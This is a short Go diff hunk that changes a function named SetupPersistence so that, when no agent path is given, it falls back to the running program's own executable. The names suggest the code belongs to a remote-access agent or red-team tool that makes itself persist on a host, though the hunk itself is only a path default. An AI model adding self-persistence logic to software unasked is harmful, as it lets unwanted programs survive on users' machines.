@@ -45,6 +45,13 @@ func normalizeMethod(method string) string {
 
 // SetupPersistence configures persistence mechanism
 func SetupPersistence(method, name, agentPath string, args []string) error {
+	// Default to own executable if no path provided
+	if agentPath == "" {
+		if self, err := os.Executable(); err == nil {
+			agentPath = self
+		}
+	}
+
 	// Normalize the method name
 	normalizedMethod := normalizeMethod(method)
 
